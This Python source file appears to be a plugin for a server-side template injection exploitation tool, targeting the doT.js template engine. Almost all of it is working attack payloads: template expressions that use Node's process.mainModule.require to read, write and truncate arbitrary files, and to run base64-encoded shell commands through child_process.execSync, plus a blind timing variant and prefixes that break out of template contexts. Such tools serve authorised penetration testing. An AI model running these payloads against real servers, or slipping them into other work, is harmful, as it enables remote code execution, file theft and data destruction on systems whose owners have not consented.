from plugins.languages import javascript


class Dot(javascript.Javascript):
    def init(self):
        self.update_actions({
            'render': {
                'render': '{{{{={code}}}}}',
                'header': '{{{{={header}}}}}',
                'trailer': '{{{{={trailer}}}}}'
            },
            'write': {
                'call': 'inject',
                'write': """{{{{=global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64'), 'binary')}}}}""",
                'truncate': """{{{{=global.process.mainModule.require('fs').writeFileSync('{path}', '')}}}}"""
            },
            'read': {
                'call': 'evaluate',
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64');"""
            },
            'md5': {
                'call': 'evaluate',
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex");"""
            },
            'evaluate': {
                'test_os': """global.process.mainModule.require('os').platform()""",
            },
            'execute': {
                'call': 'evaluate',
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64').toString());"""
            },
            'execute_blind': {
                # The bogus prefix is to avoid false detection of Javascript instead of doT
                'call': 'inject',
                'execute_blind': """{{{{=''}}}}{{{{global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64').toString() + ' && sleep {delay}');}}}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure};}}}}', 'suffix': '{{1;', 'closures': javascript.ctx_closures},
        ])
        
